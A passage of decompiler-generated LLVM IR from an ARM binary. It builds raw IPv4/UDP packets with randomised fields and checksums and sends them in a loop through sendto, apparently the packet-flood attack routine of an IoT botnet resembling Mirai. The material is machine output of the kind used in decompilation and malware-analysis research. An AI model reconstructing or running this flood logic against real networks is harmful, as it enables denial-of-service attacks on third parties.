  br i1 %v2_91e4, label %dec_label_pc_9640, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91c8
  %v3_91cc = mul i32 %v0_91cc, 65536
  %v3_91c8 = mul i32 %v0_91c8, 65536
  %v0_91d0.not = or i32 %v0_91d0, -65536
  %v1_9210 = xor i32 %v0_91d0.not, 65535
  %v3_9214 = mul i32 %v6_9128, 65536
  %v1_9218 = add i32 %v3_9214, 3407872
  %tmp67 = udiv i32 %v1_9218, 256
  %v3_922c = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9210, 256
  %v3_9230 = and i32 %tmp68, 65280
  store i32 %v3_9230, i32* %ip.global-to-local, align 4
  %v1_9234 = add i32 %v3_9214, 524288
  %v1_923c = add i32 %v3_9214, 1835008
  %tmp69 = udiv i32 %v1_9210, 256
  %v4_9240 = urem i32 %tmp69, 256
  %v5_9240 = or i32 %v4_9240, %v3_9230
  %v4_9248 = udiv i32 %v1_9218, 16777216
  %v5_9248 = or i32 %v3_922c, %v4_9248
  store i32 %v5_9248, i32* @r8, align 4
  %v3_9254 = udiv i32 %v1_923c, 256
  %tmp70 = mul i32 %v0_91d0, 256
  %v3_9258 = and i32 %tmp70, 65280
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_91d0, 256
  %v4_9268 = urem i32 %tmp71, 256
  %v5_9268 = or i32 %v4_9268, %v3_9258
  %tmp72 = mul i32 %v0_91c8, 256
  %v3_926c = and i32 %tmp72, 65280
  %v1_9270 = and i32 %v3_9254, 65280
  store i32 %v1_9270, i32* @r6, align 4
  store i32 %v3_91cc, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_91cc, 256
  %v3_927c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_91c8, 256
  %v4_9280 = urem i32 %tmp74, 256
  %v5_9280 = or i32 %v4_9280, %v3_926c
  store i32 %v5_9280, i32* @lr, align 4
  %v4_9284 = udiv i32 %v1_923c, 16777216
  %v5_9284 = or i32 %v1_9270, %v4_9284
  store i32 %v5_9284, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_91cc, 256
  %v4_9288 = urem i32 %tmp75, 256
  %v5_9288 = or i32 %v4_9288, %v3_927c
  %tmp76 = udiv i32 %v1_9234, 256
  %v3_928c = and i32 %tmp76, 65280
  store i32 %v3_928c, i32* @r5, align 4
  %v4_92a0 = udiv i32 %v1_9234, 16777216
  %v5_92a0 = or i32 %v3_928c, %v4_92a0
  store i32 %v5_92a0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9268, 65536
  %v4_930c13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9284, 65536
  %v4_9370 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9240, 65536
  %v4_9374 = sdiv i32 %sext9, 65536
  %v1_937c = trunc i32 %v4_9370 to i16
  %v2_93a4 = icmp eq i32 %v1_91d4, 0
  %sext10 = mul nuw i32 %v5_9280, 65536
  %v4_93c4 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9288, 65536
  %v4_93cc = sdiv i32 %sext11, 65536
  %v1_9304 = trunc i32 %v6_90b0 to i8
  br label %dec_label_pc_92a8

dec_label_pc_92a8:                                ; preds = %bb82, %dec_label_pc_920c
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_92b4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_905c, i32* %r2.global-to-local, align 4
  %v3_92bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92bc, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @r4, align 4
  %v5_92c0 = mul i32 %v2_92c0, 4
  %v6_92c0 = add i32 %v5_92c0, %v2_905c
  %v7_92c0 = inttoptr i32 %v6_92c0 to i32*
  store i32 %v2_92b4, i32* %v7_92c0, align 4
  %v0_92c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_92c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_92c4 = mul i32 %v1_92c4, 4
  %v5_92c4 = add i32 %v4_92c4, %v0_92c4
  %v6_92c4 = inttoptr i32 %v5_92c4 to i32*
  %v7_92c4 = load i32, i32* %v6_92c4, align 4
  store i32 %v7_92c4, i32* %r4.global-to-local, align 4
  %v1_92c8 = inttoptr i32 %v7_92c4 to i8*
  %v2_92c8 = load i8, i8* %v1_92c8, align 1
  %tmp = urem i8 %v2_92c8, 16
  %v1_92cc = zext i8 %tmp to i32
  %v1_92d0 = or i32 %v1_92cc, 64
  store i32 %v1_92d0, i32* %r2.global-to-local, align 4
  %v1_92d4 = trunc i32 %v1_92d0 to i8
  store i8 %v1_92d4, i8* %v1_92c8, align 1
  %v0_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_92dc = mul i32 %v0_92d8, 24
  store i32 %v5_92dc, i32* %r1.global-to-local, align 4
  %v0_92e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92e0 = inttoptr i32 %v0_92e0 to i8*
  %v2_92e0 = load i8, i8* %v1_92e0, align 1
  %v1_92e4 = and i8 %v2_92e0, -16
  %v1_92e8 = or i8 %v1_92e4, 5
  store i32 %v1_90dc, i32* %r5.global-to-local, align 4
  store i8 %v1_92e8, i8* %v1_92e0, align 1
  store i32 %v6_9074, i32* %r2.global-to-local, align 4
  %v2_92f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92f8 = add i32 %v2_92f8, 1
  %v4_92f8 = inttoptr i32 %v3_92f8 to i8*
  store i8 %v5_9094, i8* %v4_92f8, align 1
  store i32 %v1_90b8, i32* %r3.global-to-local, align 4
  %v0_9300 = load i32, i32* %r5.global-to-local, align 4
  %v2_9300 = icmp eq i32 %v0_9300, 0
  store i1 %v2_9300, i1* %cpsr_z.global-to-local, align 1
  %v2_9304 = load i32, i32* %r4.global-to-local, align 4
  %v3_9304 = add i32 %v2_9304, 8
  %v4_9304 = inttoptr i32 %v3_9304 to i8*
  store i8 %v1_9304, i8* %v4_9304, align 1
  %v0_9308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9308, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_92a8
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_92a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  %v3_9310 = load i32, i32* %r4.global-to-local, align 4
  %v4_9310 = add i32 %v3_9310, 6
  %v5_9310 = inttoptr i32 %v4_9310 to i16*
  store i16 64, i16* %v5_9310, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9318 = load i32, i32* %r4.global-to-local, align 4
  %v3_9318 = add i32 %v2_9318, 9
  %v4_9318 = inttoptr i32 %v3_9318 to i8*
  store i8 47, i8* %v4_9318, align 1
  %v0_931c = load i32, i32* %r4.global-to-local, align 4
  %v1_931c = add i32 %v0_931c, 20
  store i32 %v1_931c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9324 = load i32, i32* %r5.global-to-local, align 4
  %v1_9324 = trunc i32 %v0_9324 to i16
  %v3_9324 = add i32 %v0_931c, 4
  %v4_9324 = inttoptr i32 %v3_9324 to i16*
  store i16 %v1_9324, i16* %v4_9324, align 2
  %v0_9328 = load i32, i32* @r8, align 4
  %v1_9328 = trunc i32 %v0_9328 to i16
  %v2_9328 = load i32, i32* %r4.global-to-local, align 4
  %v3_9328 = add i32 %v2_9328, 2
  %v4_9328 = inttoptr i32 %v3_9328 to i16*
  store i16 %v1_9328, i16* %v4_9328, align 2
  %v0_932c = load i32, i32* %r3.global-to-local, align 4
  %v1_932c = trunc i32 %v0_932c to i16
  %v2_932c = load i32, i32* %r2.global-to-local, align 4
  %v3_932c = add i32 %v2_932c, 2
  %v4_932c = inttoptr i32 %v3_932c to i16*
  store i16 %v1_932c, i16* %v4_932c, align 2
  store i32 %v6_917c, i32* %r3.global-to-local, align 4
  %v0_9334 = load i32, i32* %r4.global-to-local, align 4
  %v1_9334 = add i32 %v0_9334, 24
  %v2_9334 = inttoptr i32 %v1_9334 to i8*
  %v3_9334 = load i8, i8* %v2_9334, align 1
  %v4_9334 = zext i8 %v3_9334 to i32
  store i32 %v4_9334, i32* %r2.global-to-local, align 4
  %v2_9338 = add i32 %v0_9334, 12
  %v3_9338 = inttoptr i32 %v2_9338 to i32*
  store i32 %v6_917c, i32* %v3_9338, align 4
  %v0_933c = load i32, i32* %r2.global-to-local, align 4
  %v1_933c = and i32 %v0_933c, -241
  %v1_9340 = or i32 %v1_933c, 64
  store i32 %v1_9340, i32* %r2.global-to-local, align 4
  %v0_9344 = load i32, i32* %r1.global-to-local, align 4
  %v1_9344 = load i32, i32* @sb, align 4
  %v2_9344 = add i32 %v1_9344, %v0_9344
  store i32 %v2_9344, i32* %r1.global-to-local, align 4
  %v1_9348 = add i32 %v2_9344, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v1_9340 to i8
  %v2_934c = load i32, i32* %r4.global-to-local, align 4
  %v3_934c = add i32 %v2_934c, 24
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i32, i32* %r4.global-to-local, align 4
  %v1_9350 = add i32 %v0_9350, 24
  %v2_9350 = inttoptr i32 %v1_9350 to i8*
  %v3_9350 = load i8, i8* %v2_9350, align 1
  %v1_9354 = and i8 %v3_9350, -16
  %v1_9358 = or i8 %v1_9354, 5
  store i8 %v1_9358, i8* %v2_9350, align 1
  %v0_9360 = load i32, i32* %r1.global-to-local, align 4
  %v1_9360 = load i32, i32* %r4.global-to-local, align 4
  %v2_9360 = add i32 %v1_9360, 16
  %v3_9360 = inttoptr i32 %v2_9360 to i32*
  store i32 %v0_9360, i32* %v3_9360, align 4
  %v0_9368 = load i32, i32* %r4.global-to-local, align 4
  %v1_9368 = add i32 %v0_9368, 24
  store i32 %v1_9368, i32* @r5, align 4
  %v3_936c = add i32 %v0_9368, 25
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v5_9094, i8* %v4_936c, align 1
  store i32 %v4_9370, i32* %r2.global-to-local, align 4
  store i32 %v4_9374, i32* %r3.global-to-local, align 4
  store i32 %v1_90b8, i32* %r1.global-to-local, align 4
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 2
  %v4_937c = inttoptr i32 %v3_937c to i16*
  store i16 %v1_937c, i16* %v4_937c, align 2
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i16
  %v2_9380 = load i32, i32* @r5, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i16*
  store i16 %v1_9380, i16* %v4_9380, align 2
  %v0_9384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9384, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = trunc i32 %v0_938c to i8
  %v2_938c = load i32, i32* @r5, align 4
  %v3_938c = add i32 %v2_938c, 8
  %v4_938c = inttoptr i32 %v3_938c to i8*
  store i8 %v1_938c, i8* %v4_938c, align 1
  %v0_9390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9390, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9390 = load i32, i32* %r2.global-to-local, align 4
  %v2_9390 = trunc i32 %v1_9390 to i16
  %v3_9390 = load i32, i32* @r5, align 4
  %v4_9390 = add i32 %v3_9390, 6
  %v5_9390 = inttoptr i32 %v4_9390 to i16*
  store i16 %v2_9390, i16* %v5_9390, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9394 = load i32, i32* %r3.global-to-local, align 4
  %v1_9394 = trunc i32 %v0_9394 to i8
  %v2_9394 = load i32, i32* @r5, align 4
  %v3_9394 = add i32 %v2_9394, 9
  %v4_9394 = inttoptr i32 %v3_9394 to i8*
  store i8 %v1_9394, i8* %v4_9394, align 1
  %v0_9398 = call i32 @rand_next()
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v1_93a8 = sub i32 1023, %v0_9398
  store i32 %v1_93a8, i32* %r3.global-to-local, align 4
  br i1 %v2_93a4, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_93b0 = load i32, i32* @r5, align 4
  %v3_93b0 = add i32 %v2_93b0, 16
  %v4_93b0 = inttoptr i32 %v3_93b0 to i32*
  store i32 %v1_93a8, i32* %v4_93b0, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_93ac = load i32, i32* %r4.global-to-local, align 4
  %v2_93ac = add i32 %v1_93ac, 16
  %v3_93ac = inttoptr i32 %v2_93ac to i32*
  %v4_93ac = load i32, i32* %v3_93ac, align 4
  store i32 %v4_93ac, i32* %r3.global-to-local, align 4
  %v2_93b4 = load i32, i32* @r5, align 4
  %v3_93b4 = add i32 %v2_93b4, 16
  %v4_93b4 = inttoptr i32 %v3_93b4 to i32*
  store i32 %v4_93ac, i32* %v4_93b4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_93b8 = load i32, i32* @r5, align 4
  %v2_93b8 = add i32 %v1_93b8, 12
  %v3_93b8 = inttoptr i32 %v2_93b8 to i32*
  store i32 %v0_9398, i32* %v3_93b8, align 4
  %v3_93bc = load i32, i32* %stack_var_-44, align 4
  %v0_93c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_93c0 = add i32 %v0_93c0, 44
  store i32 %v1_93c0, i32* @r6, align 4
  store i32 %v4_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  store i32 %v1_93c8, i32* @r4, align 4
  store i32 %v4_93cc, i32* %r3.global-to-local, align 4
  %v1_93d0 = load i32, i32* @sl, align 4
  %v9_93d0 = icmp eq i32 %v1_93c8, %v1_93d0
  store i1 %v9_93d0, i1* %cpsr_z.global-to-local, align 1
  %v0_93d4 = load i32, i32* @r7, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i16
  %v3_93d4 = add i32 %v0_93c0, 48
  %v4_93d4 = inttoptr i32 %v3_93d4 to i16*
  store i16 %v1_93d4, i16* %v4_93d4, align 2
  %v0_93d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d8 = trunc i32 %v0_93d8 to i16
  %v2_93d8 = load i32, i32* @r6, align 4
  %v3_93d8 = inttoptr i32 %v2_93d8 to i16*
  store i16 %v1_93d8, i16* %v3_93d8, align 2
  %v0_93dc = load i32, i32* %r3.global-to-local, align 4
  %v1_93dc = trunc i32 %v0_93dc to i16
  %v2_93dc = load i32, i32* @r6, align 4
  %v3_93dc = add i32 %v2_93dc, 2
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 %v1_93dc, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r4, align 4
  store i32 %v0_93e0, i32* %stack_var_-44, align 4
  %v5_93e4 = icmp slt i32 %v1_93c8, %v1_93d0
  br i1 %v5_93e4, label %dec_label_pc_92a8, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %bb82
  store i32 %v6_9128, i32* %r5.global-to-local, align 4
  %v1_93f0 = add i32 %v6_9128, 8
  store i32 %v1_93f0, i32* %r4.global-to-local, align 4
  %v0_9400.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93fc.preheader

dec_label_pc_93fc.preheader:                      ; preds = %dec_label_pc_93e8, %dec_label_pc_9640
  %v0_9400.pre = phi i32 [ %v0_9400.pre.pre, %dec_label_pc_93e8 ], [ 0, %dec_label_pc_9640 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93f0, %dec_label_pc_93e8 ], [ %v1_9648, %dec_label_pc_9640 ]
  %storemerge = add i32 %v6_9128, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95f4 = icmp eq i32 %v1_91d4, 0
  %v2_9610 = icmp eq i32 %v1_9148, 0
  %v2_943c = icmp eq i32 %v6_917c, -1
  %v7_943c = icmp eq i32 %v6_917c, -1
  br label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93fc, %dec_label_pc_948c, %dec_label_pc_93fc.preheader
  %v0_9400 = phi i32 [ %v0_9400.pre, %dec_label_pc_93fc.preheader ], [ 0, %dec_label_pc_93fc ], [ %v1_9528, %dec_label_pc_948c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9400 = icmp eq i32 %v0_9400, 0
  store i1 %v2_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9400, label %dec_label_pc_93fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93fc
  br label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_948c, %dec_label_pc_940c
  %v1_9424 = phi i32 [ %v1_9524, %dec_label_pc_948c ], [ 0, %dec_label_pc_940c ]
  %v5_9414 = mul i32 %v1_9424, 24
  %v1_9418 = load i32, i32* @sb, align 4
  %v2_9418 = add i32 %v1_9418, %v5_9414
  store i32 %v2_9418, i32* %r3.global-to-local, align 4
  store i32 %v2_905c, i32* %r4.global-to-local, align 4
  %v1_9420 = add i32 %v2_9418, 20
  %v2_9420 = inttoptr i32 %v1_9420 to i8*
  %v3_9420 = load i8, i8* %v2_9420, align 1
  %v4_9420 = zext i8 %v3_9420 to i32
  store i32 %v4_9420, i32* %r2.global-to-local, align 4
  %v4_9424 = mul i32 %v1_9424, 4
  %v5_9424 = add i32 %v4_9424, %v2_905c
  %v6_9424 = inttoptr i32 %v5_9424 to i32*
  %v7_9424 = load i32, i32* %v6_9424, align 4
  store i32 %v7_9424, i32* @r5, align 4
  %v7_9428 = icmp eq i8 %v3_9420, 31
  store i1 %v7_9428, i1* %cpsr_z.global-to-local, align 1
  %v1_942c = add i32 %v7_9424, 24
  store i32 %v1_942c, i32* @r6, align 4
  %v1_9430 = add i32 %v7_9424, 44
  store i32 %v1_9430, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9420, 32
  br i1 %tmp86, label %dec_label_pc_9538, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_9410
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_944c = load i32, i32* @fp, align 4
  %v9_944c = icmp eq i32 %v0_944c, 65535
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_944c, label %dec_label_pc_95b0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9598.dec_label_pc_9454_crit_edge, %dec_label_pc_9444
  %v1_9458 = phi i32 [ %v1_9458.pre, %dec_label_pc_9598.dec_label_pc_9454_crit_edge ], [ 65535, %dec_label_pc_9444 ]
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v9_9458 = icmp eq i32 %v3_91dc, %v1_9458
  store i1 %v9_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9458, label %dec_label_pc_95d8, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_95b0.dec_label_pc_9460_crit_edge, %dec_label_pc_9454
  %v1_9464 = phi i32 [ %v1_9464.pre, %dec_label_pc_95b0.dec_label_pc_9460_crit_edge ], [ %v1_9458, %dec_label_pc_9454 ]
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v9_9464 = icmp eq i32 %v3_91e0, %v1_9464
  store i1 %v9_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9464, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %dec_label_pc_9608, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_946c
  %v1_9474 = load i32, i32* @r5, align 4
  %v2_9474 = add i32 %v1_9474, 16
  %v3_9474 = inttoptr i32 %v2_9474 to i32*
  %v4_9474 = load i32, i32* %v3_9474, align 4
  store i32 %v4_9474, i32* %r3.global-to-local, align 4
  %v2_9478 = load i32, i32* @r6, align 4
  %v3_9478 = add i32 %v2_9478, 16
  %v4_9478 = inttoptr i32 %v3_9478 to i32*
  store i32 %v4_9474, i32* %v4_9478, align 4
  br label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %bb85, %.thread16
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608, %dec_label_pc_961c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9490 = load i32, i32* @r5, align 4
  %v3_9490 = add i32 %v2_9490, 10
  %v4_9490 = inttoptr i32 %v3_9490 to i16*
  store i16 0, i16* %v4_9490, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9498 = load i32, i32* @r5, align 4
  store i32 %v0_9498, i32* @r0, align 4
  %v2_949c = call i32 @checksum_generic(i32 %v0_9498, i32 20)
  %v3_949c = trunc i32 %v2_949c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_94a4 = load i32, i32* @r5, align 4
  %v4_94a4 = add i32 %v3_94a4, 10
  %v5_94a4 = inttoptr i32 %v4_94a4 to i16*
  store i16 %v3_949c, i16* %v5_94a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = trunc i32 %v0_94ac to i16
  %v2_94ac = load i32, i32* @r6, align 4
  %v3_94ac = add i32 %v2_94ac, 10
  %v4_94ac = inttoptr i32 %v3_94ac to i16*
  store i16 %v1_94ac, i16* %v4_94ac, align 2
  %v0_94b0 = load i32, i32* @r6, align 4
  store i32 %v0_94b0, i32* @r0, align 4
  %v2_94b4 = call i32 @checksum_generic(i32 %v0_94b0, i32 20)
  %v3_94b4 = trunc i32 %v2_94b4 to i16
  %v3_94b8 = load i32, i32* @r6, align 4
  %v4_94b8 = add i32 %v3_94b8, 10
  %v5_94b8 = inttoptr i32 %v4_94b8 to i16*
  store i16 %v3_94b4, i16* %v5_94b8, align 2
  store i32 0, i32* @r4, align 4
  %v0_94c0 = load i32, i32* @r7, align 4
  store i32 %v0_94c0, i32* @r1, align 4
  %v1_94c4 = add i32 %v0_94c0, 4
  %v2_94c4 = inttoptr i32 %v1_94c4 to i16*
  %v3_94c4 = load i16, i16* %v2_94c4, align 2
  %v4_94c4 = zext i16 %v3_94c4 to i32
  store i32 %v4_94c4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_94cc = add i32 %v0_94c0, 6
  %v4_94cc = inttoptr i32 %v3_94cc to i16*
  store i16 0, i16* %v4_94cc, align 2
  %v0_94d0 = load i32, i32* @r6, align 4
  %v4_94d4 = call i32 @checksum_tcpudp(i32 %v0_94d0, i32 %v0_94c0, i32 %v4_94c4, i32 %stack_var_-124.0.ph)
  %v5_94d4 = trunc i32 %v4_94d4 to i16
  %v3_94d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94d8, i32* %r2.global-to-local, align 4
  %v3_94dc = mul i32 %v3_94d8, 32
  store i32 %v3_94dc, i32* %r3.global-to-local, align 4
  %v0_94e0 = load i32, i32* @r5, align 4
  %v1_94e0 = add i32 %v0_94e0, 16
  %v2_94e0 = inttoptr i32 %v1_94e0 to i32*
  %v3_94e0 = load i32, i32* %v2_94e0, align 4
  %v5_94e4 = mul i32 %v3_94d8, 24
  store i32 %v5_94e4, i32* %r3.global-to-local, align 4
  %v1_94e8 = load i32, i32* @sb, align 4
  %v2_94e8 = add i32 %v1_94e8, %v5_94e4
  store i32 %v2_94e8, i32* @lr, align 4
  %v2_94ec = add i32 %v2_94e8, 4
  %v3_94ec = inttoptr i32 %v2_94ec to i32*
  store i32 %v3_94e0, i32* %v3_94ec, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* @r7, align 4
  %v4_94f4 = add i32 %v3_94f4, 6
  %v5_94f4 = inttoptr i32 %v4_94f4 to i16*
  store i16 %v5_94d4, i16* %v5_94f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94fc = load i32, i32* %r1.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i16
  %v2_94fc = load i32, i32* %r3.global-to-local, align 4
  %v3_94fc = load i32, i32* @sb, align 4
  %v4_94fc = add i32 %v3_94fc, %v2_94fc
  %v5_94fc = inttoptr i32 %v4_94fc to i16*
  store i16 %v1_94fc, i16* %v5_94fc, align 2
  %v0_9500 = load i32, i32* @r4, align 4
  %v1_9500 = trunc i32 %v0_9500 to i16
  %v2_9500 = load i32, i32* @lr, align 4
  %v3_9500 = add i32 %v2_9500, 2
  %v4_9500 = inttoptr i32 %v3_9500 to i16*
  store i16 %v1_9500, i16* %v4_9500, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9508 = load i32, i32* @r5, align 4
  store i32 %v0_9508, i32* %r1.global-to-local, align 4
  %v0_9510 = load i32, i32* @r8, align 4
  store i32 %v0_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @lr, align 4
  %v0_9518 = load i32, i32* %ip.global-to-local, align 4
  %v6_951c = call i32 @__libc_sendto(i32 %v3_9190, i32 %v0_9508, i32 %v0_9510, i32 16384, i32 %v0_9514, i32 %v0_9518)
  %v3_9520 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9520, i32* %r3.global-to-local, align 4
  %v1_9524 = add i32 %v3_9520, 1
  %v1_9528 = load i32, i32* @sl, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9524, i32* %stack_var_-44, align 4
  %v6_9530 = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v6_9530, label %dec_label_pc_9410, label %dec_label_pc_93fc

dec_label_pc_9538:                                ; preds = %dec_label_pc_9410
  %v1_9538 = add i32 %v2_9418, 16
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = call i32 @rand_next()
  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, 65280
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v5_9568 = call i32 @llvm.bswap.i32(i32 %v0_954c)
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
  %v9_95a4 = icmp eq i32 %v0_95a4, 65535
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
